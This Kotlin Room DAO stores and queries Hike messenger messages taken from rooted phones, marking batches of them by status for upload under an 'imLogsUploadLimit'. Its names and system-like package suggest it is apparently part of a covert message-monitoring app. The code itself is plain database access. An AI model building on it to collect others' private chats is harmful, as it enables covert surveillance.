package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.HikeRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface HikeRootedDao {
    
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(HikeRooted: List<HikeRooted>)

    @Query("Select * from hike_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllHikeMessages(status: Int): List<HikeRooted>

    @Query("Update hike_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from hike_rooted")
    fun selectMaxTimeStamp(): Long?
}